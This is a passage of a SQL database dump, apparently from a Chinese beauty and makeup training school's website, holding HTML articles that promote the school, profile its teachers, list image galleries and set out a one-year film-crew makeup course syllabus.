16px;\">职业不仅是用来赚钱的，更是一个人价值的体现。职业没有高低贵贱之分，有的只是你内心对职业是否尊敬。我去一个美发店剪头发，一个小凳子上坐着一个子不高40岁左右，穿黑色T恤，相貌，普通的中年男子，但是，当他站起来拿起剪刀的一瞬间，他的自信照亮了他，剪刀在他的手里舞动着，就像音乐家弹奏的音符般美妙。那一刻他是非常了不起的。他在创作美，美化你的发丝，你能说他不是社会需要的人才吗？</span></p><p style=\"margin-top: 22px; margin-bottom: 0px; padding: 0px; line-height: 24px; color: rgb(51, 51, 51); text-align: justify; font-family: arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\"></span></p><p style=\"text-align:center\"><img class=\"large\" data-loadfunc=\"0\" src=\"http://t11.baidu.com/it/u=1566879067,1861862875&fm=173&app=25&f=JPEG?w=640&h=426&s=EC222DD64021DEB7A894A9730300B061\" data-loaded=\"0\" style=\"border: 0px; width: 537px; display: block;\"/></p><p style=\"margin-top: 26px; margin-bottom: 0px; padding: 0px; line-height: 24px; color: rgb(51, 51, 51); text-align: justify; font-family: arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">会开飞机的飞行员是人才，会开汽车的司机一样是人才；会写文章的作家是人才，会美化指甲的美甲师一样是人才。每一件事都有每一件事的学问，每一件事都有每一件事的困难，每一件事都有每一件事的乐趣。既然选择做一个行业，比如美甲师，就集中精力去琢磨，一定会获得乐在其中的成就感。</span></p><p style=\"text-align:center\"><img class=\"large\" data-loadfunc=\"0\" src=\"http://t10.baidu.com/it/u=2521673547,2816047008&fm=173&app=25&f=JPEG?w=640&h=426&s=B1B65F944A022EDED8156D0C030030C3\" data-loaded=\"0\" style=\"border: 0px; width: 537px; display: block;\"/></p><p style=\"margin-top: 26px; margin-bottom: 0px; padding: 0px; line-height: 24px; color: rgb(51, 51, 51); text-align: justify; font-family: arial; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-size: 16px;\">考上大学，走进象牙塔，一步步的学习更多的知识固然可嘉可敬，然而走另外的一条路学习一门技术，同样了不起。未来的发展来看，手艺人越来越被社会尊重和认可。学习一门技术照样能成才，纹绣师、美甲师、美容美发师一样不简单！</span></p><p><br/></p>','','','1.180.238.168'),(89,27,'<p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; line-height: 3em;\"><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;郑州市中原环球美容美发晚装职业技能培训学校，简称郑州环球美容美发化妆学校，最初由广州环球美容美发集团发展而来。学校开创之初仅仅是几个穷孩子为了谋生存，经拜师学艺后开设了一家小理发店，借助兴隆的生意，发廊和美容院就一家又一家地开了起来，到目前环球已经开设了上百家发廊和美容院，这还仅仅是个开始，环球的远大目标是，要在全国开设上千家发廊和美容院。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; line-height: 3em;\"><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;为什么很多学员会有疑问，学习美容美发技能，选择美容美发学校好？还是选择发廊美容院好呢？很多学校教的不好让学员白学了的原因是什么呢？没有开设发廊和美容院的美容美发学校就是纸上谈兵，也就是说这些美容美发学校，他们自己开美容美发店都开不明白，那他们又凭什么教别人呢？他们教出来的美容美发技术可能根本就不实用，所以很多学员学了也是白学，去发廊美容院打工也会被赶出来，除非只做个打个下手的小工。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; line-height: 3em;\"><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp; 现在很多美容美发学校都是骗人的，他们以为租个教学楼，租个实习厅，配上老师，投影，傍上国际，打上广告就算是学校了。我们郑州市中原环球美容美发晚装职业技能培训学校始终认为，没有扎实的发廊美容院作为学校的后盾，教出来的学员也是没有市场竞争力的。而有了发廊美容院做保障，这种接地气的，有底气的美容美发化妆培训学校，这种和一线发廊美容院保持技术同步的美容美发化妆培训学校，才是负责任的学校，才是好的美容美发化妆培训学校，才是学员们应该放心选择的美容美发化妆培训学校。</span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/190224/1-1Z224143629140.jpg\" alt=\"1-1Z224143629140.jpg\"/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; line-height: 3em;\"><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\"><br/></span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; line-height: 21.6px; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; line-height: 3em;\"><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;发廊和美容院开好了，非常赚钱，开不好，就会亏损，我们金达莱集团运用二十多年的开店经验，上百家店的经营实践，总结出了一套开店就赚钱的科学实用的好方法。同学们，不要在开店方面走弯路了，同学们，不要因为选错学校浪费时间了，来郑州市中原环球美容美发晚装职业技能培训学校，学到的都是发廊美容院的实用技术，学到的都是发廊美容院需要的才能，为了实现您的目标，欢迎您到郑州市中原环球美容美发晚装职业技能培训学校来学习。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; line-height: 3em;\"><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp; 为了让学员们学到和一线发廊美容院保持技术同步的美容美发技术,为了让学员们学到新潮实用的美容美发技能，郑州市中原环球美容美发晚装职业技能培训学校强强加盟韩国美容美发化妆教育培训机构WHITESUNNY，搭建了韩国技术在国内的传播平台，为方便学员到韩国进修，建立了教育合作联盟。环球美容美发化妆培训学校，成为了引进韩国美容美发化妆技术以及韩国教师的专业培训学校。为了适应当今激烈竞争的美容美发化妆行业，我校与韩国WHITESUNNY教育培训机构强强联手，实行“走出去，引进来”的发展战略。目前我校引进了韩国全新的专业教学课程和前沿的韩国美容美发化妆技术，还特别聘请了韩国WHITESUNNY教育培训机构的特约韩国大师定期来我校传授形象设计课程。 &nbsp; &nbsp;&nbsp;</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; line-height: 3em;\"><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;郑州市中原环球美容美发晚装职业技能培训学校办学多年，一直以“办能让所以学员学有所成的学校”为目标。一定要教好每一位学员，必须要教好每一位学员，让学员们带着充满自信的技术走入社会，让学员们永远庆幸的就是曾经选择了环球，环球美容美发化妆培训学校针对所有的学员采用母爱式、园丁式的服务，让学员能够感受到，环球美容美发化妆培训学校全体老师不管为他们做什么事，只要对他们是有益的，都会全心全意、无怨无悔，诚心地面对每位学员，环球美容美发化妆培训学校将所有的学员当做是自己的子女一样去对待，呵护着陪伴他们走好这段学习的过程。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; line-height: 3em;\"><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 现在社会上有很多骗人的，不负责任的美容美发化妆学校，我校对这种学校表示强烈愤慨和严厉谴责。我们的孩子们交学费的血汗钱来之不易，所以学员们选择学校时一定要对得起家长，睁大眼睛，谨防上当！！！一般情况下，一旦上当受骗，所交学费是很难能从那些不负责任的学校里要出来的。&nbsp;</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; line-height: 3em;\"><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;多年来，我校老师在各种场合中崭露头角、大显身手，在业界赢得了良好的口碑，受到了大家的一致好评。通过不断的学习、创新、开拓、实践，今天已发展成为国内一流，影响力巨大，带动地方潮流的美容美发培训学校。 我校环境清新优雅，教室宽敞舒适，师资力量雄厚，授课体系科学，理念先进，教学严谨，设备一流，校风纯正。 我们本着诚信、专业、务实、创新、严谨的办学态度，拥有雄厚的师资、超前的技术、军事化管理、科学的教学，为您搭建了实现您理想的阶梯！</span></p><p><br/></p>','','','123.126.152.178'),(90,25,'<p><br/></p><p style=\"text-align: left;\"><img src=\"/uploads/allimg/20190916/1568647609374250.jpg\" title=\"1568647609374250.jpg\" alt=\"11.jpg\"/></p><p><br/></p><p style=\"text-align: left;\"><strong><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\">高级化妆讲师—李晓</span></strong><br/></p><p style=\"text-align: left;\"><strong><span style=\"font-family: arial, helvetica, sans-serif; font-size: 16px;\"><br/></span></strong></p><p style=\"text-align: left;\"><span style=\"font-size: 16px; font-family: arial, helvetica, sans-serif;\">洋河封藏大典化妆指导老师</span></p><p style=\"text-align: left;\"><span style=\"font-size: 16px; font-family: arial, helvetica, sans-serif;\">中韩古乐文化交流会特邀化妆师</span></p><p style=\"text-align: left;\"><span style=\"font-size: 16px; font-family: arial, helvetica, sans-serif;\">河南博物院乐俑复原造型化妆师</span></p><p><br/></p>','','','123.117.65.8'),(91,16,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636094954469.jpg\" style=\"\" title=\"1554636094954469.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636094335378.jpg\" style=\"\" title=\"1554636094335378.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636094570922.jpg\" style=\"\" title=\"1554636094570922.jpg\"/></p><p><br/></p>','','','124.64.18.62'),(92,16,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636211215234.jpg\" style=\"\" title=\"1554636211215234.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636211265115.jpg\" style=\"\" title=\"1554636211265115.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636211863417.jpg\" style=\"\" title=\"1554636211863417.jpg\"/></p><p><br/></p>','','','124.64.18.62'),(93,16,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636286160762.jpg\" style=\"\" title=\"1554636286160762.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636286275654.jpg\" style=\"\" title=\"1554636286275654.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636286312773.jpg\" style=\"\" title=\"1554636286312773.jpg\"/></p><p><br/></p>','','','124.64.18.62'),(94,3,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636425456813.jpg\" style=\"\" title=\"1554636425456813.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636425420381.jpg\" style=\"\" title=\"1554636425420381.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636425226588.jpg\" style=\"\" title=\"1554636425226588.jpg\"/></p><p><br/></p>','','','124.64.18.62'),(95,9,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636528226463.jpg\" style=\"\" title=\"1554636528226463.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636528680346.jpg\" style=\"\" title=\"1554636528680346.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636529818288.jpg\" style=\"\" title=\"1554636529818288.jpg\"/></p><p><br/></p>','','','124.64.18.62'),(96,9,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636574529550.jpg\" style=\"\" title=\"1554636574529550.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636574819570.jpg\" style=\"\" title=\"1554636574819570.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190407/1554636575962116.jpg\" style=\"\" title=\"1554636575962116.jpg\"/></p><p><br/></p>','','','124.64.18.62'),(97,14,'<p dir=\"ltr\"><br/></p><p dir=\"ltr\">影视剧组就业班</p><p dir=\"ltr\"><br/></p><p>学制：一年制</p><p>开学时间：每月1日、15日开学</p><p>上课方式：(全天、自由)均可</p><p>上课时间： 1、周一到周五正常上课,周六日休息</p><p>&nbsp; &nbsp; &nbsp; &nbsp;2、上课时间:上午9:00-12:00下午13:00–16：30</p><p><br/></p><p>备注：1、终身免费复修</p><p>&nbsp; &nbsp; 2、免费赠送全套化妆品化妆工具化妆箱(价值1200元)</p><p>&nbsp; &nbsp; 3、免费参加影楼、电视台、广告、活动等实习</p><p>&nbsp; &nbsp; 4、全部保障剧组就业</p><p><img src=\"/uploads/allimg/20190916/1568644986493324.jpg\" title=\"1568644986493324.jpg\" alt=\"1-(2).jpg\"/></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p><p>课程设置</p><p><br/></p><p>第一部分:化妆基础、现代基础发型</p><p>一 化妆基础</p><p>1、化妆发展史,化妆品及化妆工具的正确应</p><p>2、化妆师应该具备的条件</p><p>3、根据不同肤色选择适合的粉底</p><p>4、化妆后皮肤的保养</p><p>5、面部骨骼分析</p><p>6、 脸型、眉型、眼型、唇型的化法与改变</p><p>7、画眼线的正确技法和腮红的打法与正确的选色的运用</p><p>8、美目贴的正确剪贴和运用</p><p>&nbsp;9、假睫毛的修剪和正确粘贴</p><p>10、假睫毛的修剪和正确黏贴</p><p>11、眼影的色彩分析与正确的运用技巧</p><p>12、各种脸型的矫正化妆技法</p><p>13、结构透明妆裸妆化妆技法</p><p>14、日常生活妆的化妆方法与色彩的运用</p><p>二 现代发型</p><p>1、发型基础原理及专业造型师必备</p><p>2、基础造型分区、倒梳、手打卷、包发</p><p>3、刘海与脸型的搭配技巧</p><p>4、脸型与发型搭配技巧</p><p>5、假发认识及真假发的操作原理与技巧</p><p>6 、时尚、经典新娘造型多变分析</p><p>7 、造型饰品制作及运用原理</p><p>8 、电卷发的操作技巧及运用原理</p><p>9、盘包类手法:包的基础手法设计与运用</p><p>10、辫法类手法:插手辫、千手辫、各类编法之间的关系及辨发手法在韩式造型中的作用</p><p>11、波纹类手法:手推波纹、手摆波纹、复古类造型与时尚造型的结合</p><p>12、赫本造型:时尚赫本古风格赫本新娘赫本夸张赫本</p><p>13、朋克风格:影楼朋克造型、时尚T台朋克造型、前卫女生活朋克造型</p><p>14、欧式造型:晚会欧式造型、主持人欧式造型、T台欧式造型</p><p>15、真假发结合:发型中真假发结合及饰品和假发的应用</p><p>16、短发造型:在造型中短发的变化及演示</p><p>17、创意造型：舞台创意发型，大赛创意发型</p><p>18、发型与脸型，身型，五官，发色，场合，职业等关系与搭配设计</p><p><br/></p><p>第二部分:影楼化妆</p><p>一影楼白纱主题整体形象设计</p><p>1、影楼经典白沙主题一欧式白纱(端庄、圣洁)</p><p>2、影楼流行白纱主题韩式白纱(精致、淡雅</p><p>3、影楼特色白纱主題一芭比白纱(活泼、俏丽)</p><p>4、影楼创意白纱主题MⅨ白纱(别致、新颖)</p><p>5、影楼时尚白纱主题复古、画意新娘</p><p>6、白纱新娘整体考核、作品点评</p><p>二 影楼晚礼整体形象设计</p><p>1、影楼含蓄晚礼主题画意晚礼(温馨、惬意)</p><p>2、影楼流行晚礼主题一人鱼晚礼(魅感、优雅</p><p>3、影楼时尚晚礼主题红毯妆(简约、高雅)</p><p>4、影楼经典晚礼主题宫廷妆(高贵、华丽</p><p>5、影楼创新晚礼主题mix(艺术 个性）</p><p>6、晚礼新娘整体考核、作品点评</p><p>三 影楼特色服整体形象设计</p><p>1、影楼国风特色主题古装(雍容、华贵)</p><p>2、影楼民国特色主题旗袍秀禾(温婉、秀丽)</p><p>3、影楼艺术特色主题敦媓水噩(瑰丽、柔美)</p><p>4、影楼民族待色主题一波西米亚(自然健康)</p><p>5、影楼特色服整体考核、作品点评</p><p>四 影楼主题设计应用(写真）</p><p>1、影楼中的异域风-韩服，和服，印度，埃及</p><p>2、影楼西方文化素养培训-奇特、波普，朋克</p><p>3、同—个模特不同造型的设计与转换一流程示范</p><p>五、工作能力培训</p><p>1、影楼技术部门营销课程</p><p>2、影楼时尚、个性写真整体造型设计</p><p>3、影楼灯光、摄影、数码与化妆的配合</p><p>4、影楼常见突发事件问题的解决方法</p><p>5，年度个大型影楼的最新样片的观摩</p><p>6、化妆师与顾客的沟通技巧</p><p><br/></p><p>第三部分:高级彩妆</p><p>1、时尚妆面与日妆、婚纱妆的区别与化妆手法</p><p>2、时尚彩妆流行超势色彩选择运用</p><p>3，透明妆化妆技法</p><p>4，艺术写真（艺术照发型妆面整体造型设计）</p><p>5、电视节目主持人妆面(新闻主持、综艺栏目主持、少儿节目主持及男主持人等)</p><p>6、广告妆面(立体广告、平面广告、明星妆等)化妆技法</p><p>7、模特妆(台模特、杂志封面模特)化妆技法</p><p>8、日本艺妓妆化妆技法</p><p>9、时尚韩国流行妆化妆技法</p><p>10、欧式妆、假双化妆技法</p><p>11、晒伤妆、创艺妆化妆技法</p><p>12、大小烟熏妆的化妆技法</p><p>13、小丑妆化妆技法</p><p>14、印度妆化妆技法</p><p>15、T台男妆化妆技法</p><p>16、青年妆化妆技法</p><p>17、白领丽人妆化妆技法</p><p>18、时尚整体妆面与发型、发饰的搭配技巧</p><p><br/></p><p><img src=\"/uploads/allimg/20190916/1568645016466825.jpg\" title=\"1568645016466825.jpg\" alt=\"20.jpg\"/></p><p><br/></p><p>第四部分:毛发制作</p><p>1、工具认识—毛发制作的工具认识和所需材料</p><p>2、道士头套—根据影视剧年代人物作头套的步骤方法(道土头马蹄盖、发片)</p><p>3、清朝头套一古装半头头套制作、清朝马蹄盖头套制作</p><p>4、胡子制作—据影视剧年代人物性档制作胡子山羊胡、络腮胡一字胡</p><p>5、眉毛制作—据影视剧年代人物性格制作眉毛</p><p>6、胡子修，剪，烫的技巧</p><p>7、头套、胡子的正确粘贴方法</p><p>8、胡子、头套拍摄中穿帮遮盖技法</p><p><br/></p><p>第五部分:古代发型</p><p>1、古代发型认识</p><p>2、唐，宋，元，明，清饰品制作</p><p>3、影视古装戏梳妆的流程</p><p>4、影视古代发型梳妆所用的工具</p><p>5、唐，宋，元，明、清不同朝代发包、发件、发簪制作方法</p><p>6、影视剧不同朝代人物的发包发件运用</p><p>7、不同年代的发型区别与发型梳理技巧</p><p>8、唐，宋，元，明，清发型设计与梳理</p><p>9、清末民初二三十年代发型设计与梳理</p><p><br/></p><p>第六部分:影视化妆、伤效化妆</p><p>一 影视化妆</p><p>1、根据人物性格、身份、年龄等应用妆面及解析化妆手法</p><p>2、儿童妆、青年妆、中年妆</p><p>3、改变年龄的化妆</p><p>4、战争、乞丐、病态等特定效果妆</p><p>5、城市人物妆、农村人物妆</p><p>6、福相、苦相、恶相、善相等化妆手法解析</p><p>二 伤效化妆</p><p>1、剧中烫伤、打伤、刀伤、划伤</p><p>2、青紫、假指、伤疤</p><p>3、断手、断臂</p><p>4、血浆制作</p><p>5、唇裂、太阳晒后脱皮、村红、病态等</p><p><br/></p><p>第七部分:影视美术课程</p><p>1、色彩的认识及运用</p><p>2、人物妆面效果图</p><p>3、骨骼骷髅妆化妆</p><p>4、人体彩绘绘画设计</p><p>5、老年妆</p><p>6、骷髅妆</p><p>7、面部彩绘</p><p>8、梦幻妆</p><p><br/></p><p>第八部分:美发吹风</p><p>注:主要是针对剧组使用的美发吹风课程</p><p>1、剪发与造型的技法造型3要素</p><p>2、剪发技巧</p><p>3、剪发与削发结合使用技法</p><p>4、吹冈与造型</p><p>5、男女士的吹风造型</p><p>6、传统发式造型</p><p>7、现代发式造型</p><p>8、传统与现代混合发型</p><p>9、寸头，平头，板寸，毛寸</p><p>10、男女播音主持吹风造型</p><p>11、男女时尚吹风造型</p><p>12、波浪吹风造型</p><p>13、内翻、外翻吹风造型</p><p>14、上下结构混搭(纹理、线条组合造型）</p><p><br/></p><p><br/></p>','','','123.126.152.184'),(98,25,'<p><img src=\"/uploads/allimg/20190916/1568646009313046.jpg\" title=\"1568646009313046.jpg\" alt=\"老师.jpg\"/></p><p><br/></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">姓名：于健</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">职业：整体形象设计师</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">国家级技师</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">中国创意时尚化妆造型师</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">国家级化妆造型评委</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">国际旅游小姐冠军总决赛化妆造型师</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">新生代大赛化妆造型总监</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">中西部模特大赛特约化妆造型师</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">99年从事化妆造型行业至今，拥有精湛的技术和丰富经验，目前工作涉及影视、广告、传媒、舞台、时装、教学等多个领域。</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">&nbsp;曾担任CCTV—1 CCTV—3央视大型晚会造型设计，BTV—科教节目，凤凰卫视节目，河南卫视，时尚杂志拍摄，时装周，舞台话剧，音乐会等化妆造型师。</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">合作艺人：迪丽热巴，周渝民，王一博，肖战，斓曦，汤金媚，李凯馨，元华，郑业成，安悦溪，刘芮麟，戴斯，张赫，胡军，释小龙，张明明，白雪，陈浩民，韩栋，骆达华等</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">合作杂志：《世界时装之苑ELLE》、《时装OFFICIEL》、《时尚COSMO》《嘉人Marie claire》《时尚芭莎》《风尚志》《时装》《一号杂志》《时尚健康》《悦已SELF》《红秀GRAZIA》《时尚先生》《男人风尚》《瑞丽》《优家画报》《VOGUE服饰与美容》</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">参与拍摄影视剧</span></p><p style=\"text-indent: 0em;\"><span style=\"font-size: 18px;\">画江湖之不良人，黄金女保镖，快来绑架我，我了个去，别和我提钱，欢乐斗地主，恋恋有声，最佳女配，烈火如歌，陈情令，莽荒记，倩女幽魂，金蝉降魔，将龙大师等</span></p><p><br/></p>','','','103.219.184.72'),(99,25,'<p><img src=\"/uploads/allimg/20190916/1568646136329487.jpg\" title=\"1568646136329487.jpg\" alt=\"未标题-1.jpg\"/></p><p>刘文佳—郑州环球美容美发学校教育部长</p>','','','123.117.65.8'),(100,14,'<p dir=\"ltr\" style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\"><strong>影视剧组就业班</strong></span></p><p dir=\"ltr\" style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">学制：一年制</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">开学时间：每月1日、15日开学</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">上课方式：(全天、自由)均可</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">上课时间： 1、周一到周五正常上课,周六日休息</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;2、上课时间:上午9:00-12:00下午13:00–16：30</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal; text-indent: 2em;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">备注：1、终身免费复修</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">&nbsp; &nbsp; 2、免费赠送全套化妆品化妆工具化妆箱(价值1200元)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">&nbsp; &nbsp; 3、免费参加影楼、电视台、广告、活动等实习</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">&nbsp; &nbsp; 4、全部保障剧组就业</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal; text-align: center;\"><img src=\"http://www.zzhqxx.com/uploads/allimg/20190916/1568644986493324.jpg\" title=\"1568644986493324.jpg\" alt=\"1-(2).jpg\" style=\"border: 0px; font-stretch: normal; line-height: 1.5; font-family: tahoma, Helvetica, arial, 宋体, sans-serif; vertical-align: top;\"/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\"><strong>课程设置</strong></span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">第一部分:化妆基础、现代基础发型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">一 化妆基础</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、化妆发展史,化妆品及化妆工具的正确应</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、化妆师应该具备的条件</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、根据不同肤色选择适合的粉底</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、化妆后皮肤的保养</span></p><p 